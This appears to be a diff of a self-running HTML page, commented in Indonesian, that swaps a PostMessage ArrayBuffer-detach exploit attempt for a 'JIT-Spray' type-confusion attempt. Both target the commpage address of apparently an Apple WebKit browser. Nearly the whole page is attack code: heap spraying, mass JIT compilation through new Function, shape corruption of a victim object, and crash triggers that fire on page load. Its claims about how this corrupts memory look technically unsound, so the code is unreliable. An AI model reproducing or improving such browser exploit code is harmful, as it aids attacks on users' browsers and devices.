@@ -1,27 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PostMessage ArrayBuffer Detach (Type Confusion)</title>
+    <title>JIT-Spray Commpage Attack</title>
 </head>
 <body>
 
-    <h1>PostMessage Detach Type Confusion (Final Attack)</h1>
-    <p>Target Commpage Address (32-bit): 0x0FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan PostMessage Detach Race...</p>
+    <h1>JIT-Spray Type Confusion (Final Extreme)</h1>
+    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
+    <p id="status">INIT: Mempersiapkan JIT Profiling dan Spray...</p>
     <div id="log-area"></div>
 
     <script>
         // --- KONSTANTA COMM PAGE ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        const TARGET_LENGTH_VALUE = Number(COMM_PAGE_ASB_TARGET_OFFSET); // Gunakan Offset 0x320 sebagai nilai 32-bit
+        const COMM_PAGE_ASB_TARGET_VALUE = COMM_PAGE64_BASE_ADDRESS + BigInt("0x320"); 
         
-        const LOW_WORD = Number(COMM_PAGE64_BASE_ADDRESS & 0xFFFFFFFFn) + TARGET_LENGTH_VALUE; // Commpage Address Low Word
-        const HIGH_WORD = Number(COMM_PAGE64_BASE_ADDRESS >> 32n);
+        const LOW_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE & 0xFFFFFFFFn); 
+        const HIGH_WORD = Number(COMM_PAGE_ASB_TARGET_VALUE >> 32n);
 
         let startTime = performance.now();
-        let payloadHolders = []; 
-        let victimArray = null;
+        let jitHolders = []; 
+        let victimObject = null;
+        let attackerObject = null;
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -30,83 +30,111 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD (Targeting 32-bit fields) ---
-        function sprayPayload() {
-            log("Memulai Spraying Payload (32-bit)...", "log-spray");
-            const SPRAY_COUNT = 3000;
-            const PAYLOAD_SIZE = 100; 
+        // --- FUNGSI JIT SPRAY (Memaksa JIT menyimpan nilai sebagai instruksi) ---
+        function jitSprayPayload() {
+            log("Memulai JIT Spray (Memaksa Alokasi Code Heap)...", "log-spray");
+            const SPRAY_COUNT = 5000;
+            
+            // 1. Grooming: Memaksa JIT untuk mengkompilasi fungsi berulang
+            function generateFunction(id) {
+                let code = `
+                    // Memaksa JIT menggunakan nilai 64-bit sebagai konstanta atau instruksi
+                    const P_HIGH = ${HIGH_WORD} + ${id}; 
+                    const P_LOW = ${LOW_WORD}; 
+                    
+                    // Operasi kompleks untuk memastikan kompilasi JIT
+                    let result = 0;
+                    for (let i = 0; i < 50; i++) {
+                        result += (P_HIGH * P_LOW * i) / (P_LOW + 1);
+                    }
+                    return result;
+                `;
+                // Eval yang berulang memaksa JIT untuk alokasi baru
+                return new Function(code);
+            }
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
-                let payloadArray = new Uint32Array(PAYLOAD_SIZE);
-                // Tempatkan LOW_WORD (Commpage Address) di tengah array
-                payloadArray[5] = LOW_WORD; 
-                payloadArray[6] = 0x41414141; 
-                payloadHolders.push(payloadArray); 
+                let func = generateFunction(i);
+                // Panggil fungsi berulang kali untuk memicu kompilasi Tier 2/3 (DFG/FTL)
+                for (let j = 0; j < 10000; j++) {
+                    func(); 
+                }
+                jitHolders.push(func); 
             }
+            log(`JIT Spray selesai. ${SPRAY_COUNT} Fungsi dikompilasi.`, "log-spray");
         }
+
 
         // --- FUNGSI UTAMA ATTACK ---
-        function runDetachAttack() {
+        function runJitAttack() {
             startTime = performance.now();
-            log("Phase 1: Membuat Array Korban dan Array Buffer.", "log-init");
+            log("Phase 1: Membuat Objek Korban (Victim).", "log-init");
 
-            const BUFFER_SIZE = 1024 * 1024; // 1MB Buffer
-            let victimBuffer = new ArrayBuffer(BUFFER_SIZE);
-            // Victim Array (View) tetap berada di thread utama
-            victimArray = new Uint32Array(victimBuffer);
-            victimArray.fill(0xBABEBABE);
-            
-            // 1. FREE (Detach): Kirim ArrayBuffer ke dirinya sendiri (Window) sebagai Transferable
-            // Ini akan membuat victimBuffer menjadi 'detached' dan ArrayBuffer View C++ di belakang victimArray menjadi tidak valid.
-            window.postMessage({ cmd: 'detach', buffer: victimBuffer }, '*', [victimBuffer]);
-            log(`Phase 2: victimBuffer DITRANSFER (Detached). Length: ${victimBuffer.byteLength}`, "log-critical");
+            // 1. Membuat Objek Korban dan Penyerang dengan Shape JIT yang sama
+            function makeObject() {
+                // Objek dengan properti fixed shape
+                return { 
+                    a: 1.1, 
+                    b: 2.2, 
+                    c: 3.3,
+                    // Properti yang akan menjadi target Type Confusion
+                    target_ptr: 0x12345678, 
+                    d: 4.4 
+                };
+            }
 
-            // 2. SPRAY SINKRON
-            // Kernel memori yang menyimpan buffer yang sudah detached/free harus segera ditimpa.
-            sprayPayload(); 
-            log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");
-            
-            // 3. TRIGGER: Akses Victim Array yang seharusnya sudah tidak memiliki Buffer.
-            // Jika ArrayBuffer View C++ (yang ada di belakang victimArray) tidak diperbarui dengan benar, 
-            // array ini akan membaca dari memori yang baru di-spray.
-            
+            // Kumpulkan statistik JIT (Profile)
+            for (let i = 0; i < 10000; i++) {
+                makeObject();
+            }
+
+            // Alokasikan Objek Korban dan Penyerang di Heap
+            victimObject = makeObject(); 
+            attackerObject = makeObject(); 
+
+            log("Phase 2: JIT-Spray aktif, menimpa Heap C++.", "log-critical");
+
+            // 2. JIT Spray Agresif (Memasukkan Payload Commpage ke Code Heap)
+            jitSprayPayload(); 
+
+            // 3. Trigger Type Confusion (Mengubah Tipe Korban)
+            // Lakukan modifikasi bentuk (shape) pada objek korban yang memaksa JIT
+            // untuk membersihkan/mengalokasi ulang slot memori JIT-nya.
+            delete victimObject.c;
+            victimObject.new_prop = 9.9; 
+            log("Phase 3: Shape Victim Object Dimodifikasi (Corrupting JIT Type).", "log-critical");
+
+            // 4. Trigger Final: Membaca Register yang Corrupt
             setTimeout(() => {
-                log("Phase 4: Memicu Access OOB pada Array yang Detached.", "log-critical");
-
+                log("Phase 4: Memicu Baca Register (Final Read).", "log-critical");
+                
+                // JIT sekarang mungkin mengira victimObject memiliki tipe yang sama dengan attackerObject
+                // yang slot target_ptr-nya (yang harusnya 0x12345678) kini ditimpa oleh JIT Code Heap.
+                
                 try {
-                    // Coba baca di index 5, yang seharusnya diisi oleh LOW_WORD di sprayPayload
-                    const OOB_INDEX = 5; 
-                    const crashValue = victimArray[OOB_INDEX]; 
+                    // Coba akses properti yang slotnya kita target
+                    const readValue = attackerObject.target_ptr; 
                     
-                    log(`Nilai dibaca: 0x${crashValue.toString(16)}`, "log-critical");
+                    log(`Nilai Register (target_ptr) dibaca: 0x${readValue.toString(16)}`, "log-critical");
 
-                    // SUCCESS JIKA: crashValue == Commpage LOW_WORD
-                    if (crashValue === LOW_WORD) {
-                        log("SUCCESS: Detach/Type Confusion Berhasil! Commpage Address Ditemukan!", "log-success");
+                    // Trigger Kontrol Register (EXC_BAD_ACCESS di JIT/Register)
+                    if (readValue) {
+                        // Memaksa penggunaan nilai sebagai pointer untuk Kontrol Register
+                        let crashFunction = new Function('a', `return a[${readValue}]`);
+                        crashFunction(new Array(10));
                     }
 
-                    // Trigger Final (Jika OOB Read berhasil): Paksa JIT crash dengan nilai yang dibaca
-                    let finalArray = new Array(crashValue & 0xFFFF);
-                    finalArray.fill(0);
-
                 } catch(e) {
-                     log(`JS Exception saat Trigger: ${e.message} - Menunggu Crash OS.`, "log-critical");
+                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
                 }
 
-            }, 50);
+            }, 100);
         }
         
-        // Listener untuk menangkap hasil PostMessage (tidak melakukan apa-apa selain membersihkan)
-        window.onmessage = function(e) {
-            if (e.data && e.data.cmd === 'detach') {
-                log("PostMessage diterima. Transfer Buffer Selesai.", "log-info");
-            }
-        };
-
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian PostMessage Detach Attack...';
-            setTimeout(runDetachAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Type Confusion.';
+            document.getElementById('status').textContent = 'Memulai rangkaian JIT-Spray Attack...';
+            setTimeout(runJitAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah JIT-Spray.';
         });
     </script>
     <style>
